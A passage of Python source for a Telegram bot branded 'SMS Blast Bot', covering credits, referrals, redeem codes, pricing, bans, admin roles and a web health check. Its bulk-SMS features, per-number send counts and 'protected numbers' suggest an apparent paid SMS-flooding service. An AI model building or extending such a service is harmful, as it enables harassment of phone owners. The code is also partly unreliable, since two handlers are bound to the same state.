        text += f"💳 Credits: {user.get('credits', 0)}\n"
        text += f"📤 Uses: {user.get('uses', 0)}\n"
        text += f"📅 Joined: {datetime.fromtimestamp(user.get('joined_at', 0)).strftime('%Y-%m-%d %H:%M')}\n\n"
        
    if len(users) > 20:
        text += f"... and {len(users) - 20} more users"
        
    await message.reply(text)

# ================================
# CREDITS MANAGEMENT
# ================================

async def show_credits(message: Message, user_id: str):
    """Show user credits"""
    user = await db.get_user(user_id)
    if not user:
        await message.reply("❌ User not found.")
        return
        
    credits = user.get("credits", 0)
    uses = user.get("uses", 0)
    refer_code = user.get("refer_code", "N/A")
    
    await message.reply(
        f"💳 <b>Your Credits</b>\n\n"
        f"💰 Credits: {credits}\n"
        f"📤 Total SMS Sent: {uses}\n"
        f"🔑 Referral Code: {refer_code}\n\n"
        f"<i>Each SMS costs 1 credit.</i>"
    )

async def add_credits_flow(message: Message, state: FSMContext, user_id: str):
    """Add credits to user"""
    await state.set_state(AdminStates.add_credits)
    await message.reply(
        "💰 <b>Add Credits</b>\n\n"
        "Send the user ID and amount to add.\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456789 50</code>\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_credits)
async def process_add_credits(message: Message, state: FSMContext):
    """Process adding credits"""
    try:
        parts = message.text.strip().split()
        if len(parts) != 2:
            await message.reply("❌ Invalid format. Use: USER_ID AMOUNT")
            return
            
        target_user = parts[0]
        amount = int(parts[1])
        
        if amount <= 0:
            await message.reply("❌ Amount must be positive.")
            return
            
        data = await db.get_data()
        if target_user not in data["users"]:
            await message.reply("❌ User not found.")
            return
            
        data["users"][target_user]["credits"] += amount
        await db.update_data(data)
        await db.log_activity("credits_add", f"Added {amount} to {target_user}")
        
        await message.reply(f"✅ Added {amount} credits to {target_user}")
        await state.clear()
        
    except ValueError:
        await message.reply("❌ Invalid amount.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

async def deduct_credits_flow(message: Message, state: FSMContext, user_id: str):
    """Deduct credits from user"""
    await state.set_state(AdminStates.deduct_credits)
    await message.reply(
        "💰 <b>Deduct Credits</b>\n\n"
        "Send the user ID and amount to deduct.\n"
        "Format: <code>USER_ID AMOUNT</code>\n"
        "Example: <code>123456789 50</code>\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.deduct_credits)
async def process_deduct_credits(message: Message, state: FSMContext):
    """Process deducting credits"""
    try:
        parts = message.text.strip().split()
        if len(parts) != 2:
            await message.reply("❌ Invalid format. Use: USER_ID AMOUNT")
            return
            
        target_user = parts[0]
        amount = int(parts[1])
        
        if amount <= 0:
            await message.reply("❌ Amount must be positive.")
            return
            
        data = await db.get_data()
        if target_user not in data["users"]:
            await message.reply("❌ User not found.")
            return
            
        current = data["users"][target_user]["credits"]
        if current < amount:
            await message.reply(f"❌ User has only {current} credits.")
            return
            
        data["users"][target_user]["credits"] -= amount
        await db.update_data(data)
        await db.log_activity("credits_deduct", f"Deducted {amount} from {target_user}")
        
        await message.reply(f"✅ Deducted {amount} credits from {target_user}")
        await state.clear()
        
    except ValueError:
        await message.reply("❌ Invalid amount.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

# ================================
# STATISTICS AND LOGS
# ================================

async def show_stats(message: Message, user_id: str):
    """Show API statistics"""
    data = await db.get_data()
    stats = data.get("stats", {})
    
    devices = db.get_cache().get("devices", [])
    
    await message.reply(
        f"📊 <b>Statistics</b>\n\n"
        f"📤 Total Sent: {stats.get('total_sent', 0)}\n"
        f"📥 Total Failed: {stats.get('total_failed', 0)}\n"
        f"📱 Online Devices: {len(devices)}\n"
        f"👥 Total Users: {len(data.get('users', {}))}\n"
        f"🔑 Total Firebase: {len(data.get('firebases', []))}\n"
        f"🛡 Protected Numbers: {len(data.get('protected_numbers', []))}"
    )

async def show_activity_log(message: Message, user_id: str):
    """Show activity log"""
    data = await db.get_data()
    log = data.get("activity_log", [])
    
    if not log:
        await message.reply("📜 No activity log entries.")
        return
        
    text = "📜 <b>Activity Log (Last 20)</b>\n\n"
    for entry in list(log)[-20:]:
        timestamp = datetime.fromtimestamp(entry.get("timestamp", 0)).strftime("%Y-%m-%d %H:%M")
        action = entry.get("action", "Unknown")
        details = entry.get("details", "")
        text += f"🕐 {timestamp}\n"
        text += f"📌 {action}\n"
        text += f"📝 {details}\n\n"
        
    await message.reply(text)

# ================================
# REFERRAL SYSTEM
# ================================

async def show_referral(message: Message, user_id: str):
    """Show referral information"""
    user = await db.get_user(user_id)
    if not user:
        await message.reply("❌ User not found.")
        return
        
    ref_code = user.get("refer_code", "N/A")
    data = await db.get_data()
    ref_credits = data["settings"].get("ref_credits", 3)
    
    # Count referrals
    referrals = 0
    for uid, u in data["users"].items():
        if u.get("referred_by") == ref_code:
            referrals += 1
            
    await message.reply(
        f"👥 <b>Referral System</b>\n\n"
        f"🔑 Your Referral Code: <code>{ref_code}</code>\n"
        f"👤 Referrals: {referrals}\n"
        f"💰 Credits per Referral: {ref_credits}\n\n"
        f"<i>Share your referral code to earn credits!</i>\n\n"
        f"Link: t.me/{os.getenv('BOT_USERNAME', '')}?start={ref_code}"
    )

# ================================
# REDEEM CODES
# ================================

async def manage_redeem(message: Message, state: FSMContext, user_id: str):
    """Manage redeem codes"""
    data = await db.get_data()
    codes = data.get("redeem_codes", {})
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Generate Code", callback_data="redeem:generate")],
        [InlineKeyboardButton("📋 View Codes", callback_data="redeem:view")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    text = f"🎁 <b>Redeem Codes</b>\n\n"
    if codes:
        text += f"Total: {len(codes)}\n\n"
        for code, info in list(codes.items())[:5]:
            text += f"📌 {code}\n"
            text += f"💰 {info.get('credits', 0)} credits\n"
            text += f"📊 Used: {info.get('used', 0)}/{info.get('max_uses', 0)}\n\n"
        if len(codes) > 5:
            text += f"... and {len(codes) - 5} more codes"
    else:
        text += "No redeem codes."
        
    await message.reply(text, reply_markup=keyboard)

async def redeem_code_flow(message: Message, state: FSMContext, user_id: str):
    """Redeem a code"""
    await state.set_state(AdminStates.redeem_code)
    await message.reply(
        "🎁 <b>Redeem Code</b>\n\n"
        "Send the redeem code:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.redeem_code)
async def process_redeem(message: Message, state: FSMContext):
    """Process redeem code"""
    code = message.text.strip().upper()
    
    data = await db.get_data()
    if code not in data.get("redeem_codes", {}):
        await message.reply("❌ Invalid code.")
        return
        
    code_data = data["redeem_codes"][code]
    if code_data.get("used", 0) >= code_data.get("max_uses", 0):
        await message.reply("❌ Code has been fully used.")
        return
        
    user_id = str(message.from_user.id)
    if user_id in code_data.get("used_by", []):
        await message.reply("❌ You have already used this code.")
        return
        
    # Redeem
    credits = code_data.get("credits", 0)
    if user_id not in data["users"]:
        await message.reply("❌ User not found.")
        return
        
    data["users"][user_id]["credits"] += credits
    code_data["used"] = code_data.get("used", 0) + 1
    if "used_by" not in code_data:
        code_data["used_by"] = []
    code_data["used_by"].append(user_id)
    
    await db.update_data(data)
    await db.log_activity("redeem", f"{user_id} redeemed {code} for {credits} credits")
    
    await message.reply(f"✅ Redeemed {credits} credits!")
    await state.clear()

# ================================
# BROADCAST
# ================================

async def broadcast_flow(message: Message, state: FSMContext, user_id: str):
    """Broadcast message to all users"""
    await state.set_state(AdminStates.broadcast)
    await message.reply(
        "📢 <b>Broadcast</b>\n\n"
        "Send the message to broadcast to all users.\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    """Process broadcast"""
    msg = message.text
    
    data = await db.get_data()
    users = data.get("users", {})
    
    await message.reply(f"📢 Sending broadcast to {len(users)} users...")
    
    sent = 0
    failed = 0
    
    for uid in users.keys():
        try:
            await bot.send_message(int(uid), f"📢 <b>Broadcast</b>\n\n{msg}")
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
        
    await message.reply(f"✅ Broadcast complete!\n\n✅ Sent: {sent}\n❌ Failed: {failed}")
    await db.log_activity("broadcast", f"Broadcast sent to {sent} users")
    await state.clear()

# ================================
# FORCE JOIN MANAGEMENT
# ================================

async def manage_force_join(message: Message, state: FSMContext, user_id: str):
    """Manage force join channels"""
    data = await db.get_data()
    force_join = data.get("force_join", {})
    enabled = force_join.get("enabled", False)
    channels = force_join.get("channels", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(f"Toggle {'ON' if enabled else 'OFF'}", callback_data="force:toggle")],
        [InlineKeyboardButton("➕ Add Channel", callback_data="force:add")],
        [InlineKeyboardButton("🗑 Remove Channel", callback_data="force:remove")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    text = f"🔗 <b>Force Join Management</b>\n\n"
    text += f"Status: {'✅ Enabled' if enabled else '❌ Disabled'}\n"
    text += f"Channels: {len(channels)}\n\n"
    if channels:
        for channel in channels:
            text += f"📌 {channel}\n"
    else:
        text += "No channels set."
        
    await message.reply(text, reply_markup=keyboard)

@dp.callback_query(F.data == "force:toggle")
async def toggle_force_join(callback: CallbackQuery):
    """Toggle force join"""
    data = await db.get_data()
    data["force_join"]["enabled"] = not data["force_join"]["enabled"]
    await db.update_data(data)
    await callback.answer(f"Force join {'enabled' if data['force_join']['enabled'] else 'disabled'}")
    await manage_force_join(callback.message, None, str(callback.from_user.id))

@dp.callback_query(F.data == "force:add")
async def add_force_channel(callback: CallbackQuery, state: FSMContext):
    """Add channel to force join"""
    await callback.answer()
    await state.set_state(AdminStates.add_channel)
    await callback.message.reply(
        "🔗 <b>Add Channel</b>\n\n"
        "Send the channel username or ID.\n"
        "Example: @channel or -100123456789\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_channel)
async def process_add_channel(message: Message, state: FSMContext):
    """Process adding channel"""
    channel = message.text.strip()
    
    data = await db.get_data()
    if channel not in data["force_join"]["channels"]:
        data["force_join"]["channels"].append(channel)
        await db.update_data(data)
        await db.log_activity("force_join_add", f"Added channel: {channel}")
        await message.reply(f"✅ Channel added: {channel}")
    else:
        await message.reply("❌ Channel already exists.")
    await state.clear()

@dp.callback_query(F.data == "force:remove")
async def remove_force_channel(callback: CallbackQuery, state: FSMContext):
    """Remove channel from force join"""
    await callback.answer()
    data = await db.get_data()
    channels = data["force_join"]["channels"]
    
    if not channels:
        await callback.message.reply("❌ No channels to remove.")
        return
        
    keyboard = []
    for channel in channels:
        keyboard.append([InlineKeyboardButton(f"📌 {channel}", callback_data=f"force:remove:{channel}")])
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="owner:force_join")])
    
    await callback.message.reply(
        "🗑 <b>Remove Channel</b>\n\n"
        "Select a channel to remove:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@dp.callback_query(F.data.startswith("force:remove:"))
async def process_remove_channel(callback: CallbackQuery):
    """Process removing channel"""
    channel = callback.data.replace("force:remove:", "")
    
    data = await db.get_data()
    if channel in data["force_join"]["channels"]:
        data["force_join"]["channels"].remove(channel)
        await db.update_data(data)
        await db.log_activity("force_join_remove", f"Removed channel: {channel}")
        await callback.answer("✅ Channel removed!")
        await callback.message.reply(f"✅ Removed channel: {channel}")
    else:
        await callback.answer("❌ Channel not found.")

# ================================
# PRICING PLANS
# ================================

async def manage_pricing(message: Message, state: FSMContext, user_id: str):
    """Manage pricing plans"""
    data = await db.get_data()
    plans = data.get("pricing", {}).get("plans", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Add Plan", callback_data="pricing:add")],
        [InlineKeyboardButton("🗑 Remove Plan", callback_data="pricing:remove")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    text = f"💳 <b>Pricing Plans</b>\n\n"
    if plans:
        for plan in plans:
            text += f"📌 {plan.get('name', 'Unnamed')}\n"
            text += f"💰 {plan.get('price', 0)} INR\n"
            text += f"💳 {plan.get('credits', 0)} credits\n"
            text += f"🔗 {plan.get('link', 'No link')}\n\n"
    else:
        text += "No pricing plans available."
        
    await message.reply(text, reply_markup=keyboard)

@dp.callback_query(F.data == "pricing:add")
async def add_pricing(callback: CallbackQuery, state: FSMContext):
    """Add pricing plan"""
    await callback.answer()
    await state.set_state(AdminStates.add_credits)  # Reuse state
    await callback.message.reply(
        "💳 <b>Add Pricing Plan</b>\n\n"
        "Send the plan details in this format:\n"
        "<code>NAME | PRICE | CREDITS | PAYMENT_LINK</code>\n"
        "Example: <code>Basic Plan | 100 | 150 | https://pay.link</code>\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_credits)
async def process_add_pricing(message: Message, state: FSMContext):
    """Process adding pricing plan"""
    try:
        parts = message.text.strip().split("|")
        if len(parts) != 4:
            await message.reply("❌ Invalid format. Use: NAME | PRICE | CREDITS | LINK")
            return
            
        name = parts[0].strip()
        price = int(parts[1].strip())
        credits = int(parts[2].strip())
        link = parts[3].strip()
        
        data = await db.get_data()
        if "pricing" not in data:
            data["pricing"] = {"plans": []}
        data["pricing"]["plans"].append({
            "name": name,
            "price": price,
            "credits": credits,
            "link": link,
            "added_at": int(time.time())
        })
        await db.update_data(data)
        await db.log_activity("pricing_add", f"Added plan: {name}")
        
        await message.reply(f"✅ Plan added: {name}")
        await state.clear()
        
    except ValueError:
        await message.reply("❌ Invalid price or credits.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

async def show_pricing(message: Message, user_id: str):
    """Show pricing plans to user"""
    data = await db.get_data()
    plans = data.get("pricing", {}).get("plans", [])
    
    if not plans:
        await message.reply("💳 <b>Pricing Plans</b>\n\nNo plans available.")
        return
        
    text = "💳 <b>Pricing Plans</b>\n\n"
    for plan in plans:
        text += f"📌 <b>{plan.get('name', 'Unnamed')}</b>\n"
        text += f"💰 {plan.get('price', 0)} INR\n"
        text += f"💳 {plan.get('credits', 0)} credits\n"
        text += f"🔗 <a href='{plan.get('link', '#')}'>Buy Now</a>\n\n"
        
    await message.reply(text)

# ================================
# USER STATISTICS
# ================================

async def show_user_stats(message: Message, user_id: str):
    """Show user statistics"""
    user = await db.get_user(user_id)
    if not user:
        await message.reply("❌ User not found.")
        return
        
    history = user.get("sms_history", [])
    total_sent = user.get("uses", 0)
    credits = user.get("credits", 0)
    
    await message.reply(
        f"📊 <b>Your Statistics</b>\n\n"
        f"💳 Credits: {credits}\n"
        f"📤 SMS Sent: {total_sent}\n"
        f"📋 History Entries: {len(history)}\n"
        f"📅 Joined: {datetime.fromtimestamp(user.get('joined_at', 0)).strftime('%Y-%m-%d %H:%M')}"
    )

async def show_user_history(message: Message, user_id: str):
    """Show user SMS history"""
    user = await db.get_user(user_id)
    if not user:
        await message.reply("❌ User not found.")
        return
        
    history = user.get("sms_history", [])
    
    if not history:
        await message.reply("📜 No SMS history.")
        return
        
    text = "📜 <b>Your SMS History (Last 10)</b>\n\n"
    for entry in list(history)[-10:]:
        timestamp = datetime.fromtimestamp(entry.get("timestamp", 0)).strftime("%Y-%m-%d %H:%M")
        number = entry.get("number", "Unknown")
        msg = entry.get("message", "N/A")
        count = entry.get("count", 1)
        text += f"📱 {number}\n"
        text += f"📝 {msg}\n"
        text += f"📤 Count: {count}\n"
        text += f"🕐 {timestamp}\n\n"
        
    await message.reply(text)

async def show_sms_history(message: Message, user_id: str, history_type: str):
    """Show global SMS history for admin/owner"""
    data = await db.get_data()
    history = data.get("sms_history", {})
    
    if not history:
        await message.reply("📋 No SMS history.")
        return
        
    text = "📋 <b>SMS History (Last 10)</b>\n\n"
    for entry in list(history.values())[-10:]:
        timestamp = datetime.fromtimestamp(entry.get("timestamp", 0)).strftime("%Y-%m-%d %H:%M")
        user = entry.get("user", "Unknown")
        number = entry.get("number", "Unknown")
        msg = entry.get("message", "N/A")
        text += f"👤 {user}\n"
        text += f"📱 {number}\n"
        text += f"📝 {msg}\n"
        text += f"🕐 {timestamp}\n\n"
        
    await message.reply(text)

# ================================
# SETTINGS AND INFO
# ================================

async def show_settings(message: Message, user_id: str):
    """Show bot settings"""
    data = await db.get_data()
    settings = data.get("settings", {})
    
    await message.reply(
        f"⚙️ <b>Bot Settings</b>\n\n"
        f"👑 Owners: {len(data.get('owners', []))}\n"
        f"🛡 Admins: {len(data.get('admins', []))}\n"
        f"🔗 Referral Credits: {settings.get('ref_credits', 3)}\n"
        f"📤 Total Users: {len(data.get('users', {}))}\n"
        f"🔥 Firebase: {len(data.get('firebases', []))}\n"
        f"📱 Online Devices: {len(db.get_cache().get('devices', []))}\n"
        f"🛡 Protected Numbers: {len(data.get('protected_numbers', []))}\n"
        f"💸 Free Mode: {'✅' if data.get('free_mode', False) else '❌'}"
    )

async def show_info(message: Message, user_id: str):
    """Show bot information"""
    data = await db.get_data()
    
    await message.reply(
        f"ℹ️ <b>About SMS Blast Bot v3.0 ULTRA</b>\n\n"
        f"🔹 <b>Features:</b>\n"
        f"• Bulk SMS sending\n"
        f"• Multi-device support\n"
        f"• Real-time progress\n"
        f"• Referral system\n"
        f"• Credits system\n"
        f"• Protected numbers\n"
        f"• Admin/owner panels\n"
        f"• Force join channels\n"
        f"• Pricing plans\n"
        f"• Redeem codes\n\n"
        f"📊 <b>Stats:</b>\n"
        f"👥 Users: {len(data.get('users', {}))}\n"
        f"📤 SMS Sent: {data.get('stats', {}).get('total_sent', 0)}\n"
        f"📱 Online Devices: {len(db.get_cache().get('devices', []))}\n\n"
        f"🤖 <b>Bot Status:</b> Active\n"
        f"📅 Version: 3.0 ULTRA"
    )

async def toggle_free_mode(message: Message, user_id: str):
    """Toggle free mode"""
    data = await db.get_data()
    data["free_mode"] = not data.get("free_mode", False)
    await db.update_data(data)
    status = "Enabled" if data["free_mode"] else "Disabled"
    await message.reply(f"🔄 Free Mode {status}!")
    await db.log_activity("free_mode", f"Free mode {status} by {user_id}")
    
    # Refresh keyboard
    keyboard = await get_main_keyboard(int(user_id))
    await message.reply("🔄 Refreshed!", reply_markup=keyboard)

async def export_script(message: Message, user_id: str):
    """Export the bot script"""
    try:
        script_path = __file__
        if os.path.exists(script_path):
            # Send the script file
            file = FSInputFile(script_path, filename="sms_blast_bot_v3.py")
            await message.reply_document(
                document=file,
                caption="📤 <b>Bot Script Export</b>\n\nVersion: 3.0 ULTRA\nDate: " + datetime.now().strftime("%Y-%m-%d %H:%M")
            )
        else:
            await message.reply("❌ Script file not found.")
    except Exception as e:
        await message.reply(f"❌ Error exporting script: {e}")

# ================================
# BAN/UNBAN FUNCTIONS
# ================================

async def ban_user_flow(message: Message, state: FSMContext, user_id: str):
    """Ban a user"""
    await state.set_state(AdminStates.ban_user)
    await message.reply(
        "🚫 <b>Ban User</b>\n\n"
        "Send the user ID to ban:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.ban_user)
async def process_ban_user(message: Message, state: FSMContext):
    """Process ban user"""
    user_id = message.text.strip()
    
    data = await db.get_data()
    if user_id not in data["users"]:
        await message.reply("❌ User not found.")
        return
        
    if user_id not in data["banned"]:
        data["banned"].append(user_id)
        await db.update_data(data)
        await db.log_activity("ban", f"Banned user {user_id}")
        await message.reply(f"✅ User {user_id} banned.")
    else:
        await message.reply("❌ User already banned.")
    await state.clear()

async def unban_user_flow(message: Message, state: FSMContext, user_id: str):
    """Unban a user"""
    await state.set_state(AdminStates.unban_user)
    await message.reply(
        "✅ <b>Unban User</b>\n\n"
        "Send the user ID to unban:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.unban_user)
async def process_unban_user(message: Message, state: FSMContext):
    """Process unban user"""
    user_id = message.text.strip()
    
    data = await db.get_data()
    if user_id in data["banned"]:
        data["banned"].remove(user_id)
        await db.update_data(data)
        await db.log_activity("unban", f"Unbanned user {user_id}")
        await message.reply(f"✅ User {user_id} unbanned.")
    else:
        await message.reply("❌ User not banned.")
    await state.clear()

# ================================
# ADMIN MANAGEMENT
# ================================

async def manage_super_admins(message: Message, state: FSMContext, user_id: str):
    """Manage super admins (owners)"""
    data = await db.get_data()
    owners = data.get("owners", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Add Super Admin", callback_data="owner:add_super")],
        [InlineKeyboardButton("🗑 Remove Super Admin", callback_data="owner:remove_super")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    text = f"👑 <b>Super Admins (Owners)</b>\n\n"
    for owner in owners:
        text += f"🆔 {owner}\n"
    text += f"\nTotal: {len(owners)}"
    
    await message.reply(text, reply_markup=keyboard)

@dp.callback_query(F.data == "owner:add_super")
async def add_super_admin(callback: CallbackQuery, state: FSMContext):
    """Add super admin"""
    await callback.answer()
    await state.set_state(AdminStates.add_owner)
    await callback.message.reply(
        "👑 <b>Add Super Admin</b>\n\n"
        "Send the user ID to add as super admin:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_owner)
async def process_add_super_admin(message: Message, state: FSMContext):
    """Process adding super admin"""
    user_id = int(message.text.strip())
    
    data = await db.get_data()
    if user_id not in data["owners"]:
        data["owners"].append(user_id)
        await db.update_data(data)
        await db.log_activity("add_super_admin", f"Added super admin {user_id}")
        await message.reply(f"✅ User {user_id} added as super admin.")
    else:
        await message.reply("❌ User is already a super admin.")
    await state.clear()

@dp.callback_query(F.data == "owner:remove_super")
async def remove_super_admin(callback: CallbackQuery, state: FSMContext):
    """Remove super admin"""
    await callback.answer()
    await state.set_state(AdminStates.remove_owner)
    await callback.message.reply(
        "👑 <b>Remove Super Admin</b>\n\n"
        "Send the user ID to remove from super admins:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.remove_owner)
async def process_remove_super_admin(message: Message, state: FSMContext):
    """Process removing super admin"""
    user_id = int(message.text.strip())
    
    if user_id == OWNER_ID:
        await message.reply("❌ Cannot remove main owner.")
        return
        
    data = await db.get_data()
    if user_id in data["owners"]:
        data["owners"].remove(user_id)
        await db.update_data(data)
        await db.log_activity("remove_super_admin", f"Removed super admin {user_id}")
        await message.reply(f"✅ User {user_id} removed from super admins.")
    else:
        await message.reply("❌ User is not a super admin.")
    await state.clear()

async def manage_regular_admins(message: Message, state: FSMContext, user_id: str):
    """Manage regular admins"""
    data = await db.get_data()
    admins = data.get("admins", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Add Admin", callback_data="owner:add_admin")],
        [InlineKeyboardButton("🗑 Remove Admin", callback_data="owner:remove_admin")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    text = f"🛡 <b>Admins</b>\n\n"
    for admin in admins:
        text += f"🆔 {admin}\n"
    text += f"\nTotal: {len(admins)}"
    
    await message.reply(text, reply_markup=keyboard)

@dp.callback_query(F.data == "owner:add_admin")
async def add_regular_admin(callback: CallbackQuery, state: FSMContext):
    """Add regular admin"""
    await callback.answer()
    await state.set_state(AdminStates.add_admin)
    await callback.message.reply(
        "🛡 <b>Add Admin</b>\n\n"
        "Send the user ID to add as admin:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_admin)
async def process_add_admin(message: Message, state: FSMContext):
    """Process adding regular admin"""
    user_id = int(message.text.strip())
    
    data = await db.get_data()
    if user_id not in data["admins"] and user_id not in data["owners"]:
        data["admins"].append(user_id)
        await db.update_data(data)
        await db.log_activity("add_admin", f"Added admin {user_id}")
        await message.reply(f"✅ User {user_id} added as admin.")
    else:
        await message.reply("❌ User is already an admin or super admin.")
    await state.clear()

@dp.callback_query(F.data == "owner:remove_admin")
async def remove_regular_admin(callback: CallbackQuery, state: FSMContext):
    """Remove regular admin"""
    await callback.answer()
    await state.set_state(AdminStates.remove_admin)
    await callback.message.reply(
        "🛡 <b>Remove Admin</b>\n\n"
        "Send the user ID to remove from admins:\n\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.remove_admin)
async def process_remove_admin(message: Message, state: FSMContext):
    """Process removing regular admin"""
    user_id = int(message.text.strip())
    
    data = await db.get_data()
    if user_id in data["admins"]:
        data["admins"].remove(user_id)
        await db.update_data(data)
        await db.log_activity("remove_admin", f"Removed admin {user_id}")
        await message.reply(f"✅ User {user_id} removed from admins.")
    else:
        await message.reply("❌ User is not an admin.")
    await state.clear()

# ================================
# WEB SERVER FOR RAILWAY
# ================================

from flask import Flask, render_template, send_file, jsonify, request
import threading

flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "✅ SMS Blast Bot v3.0 ULTRA is running!"

@flask_app.route('/health')
def health():
    data = asyncio.run(db.get_data())
    return jsonify({
        "status": "online",
        "users": len(data.get('users', {})),
        "devices": len(db.get_cache().get('devices', [])),
        "timestamp": int(time.time())
    })

def run_web():
    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# ================================
# MAIN
# ================================

async def main():
    # Start web server in background
    threading.Thread(target=run_web, daemon=True).start()
    
    # Start background scanner
    asyncio.create_task(device_scanner())
    
    # Start polling
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
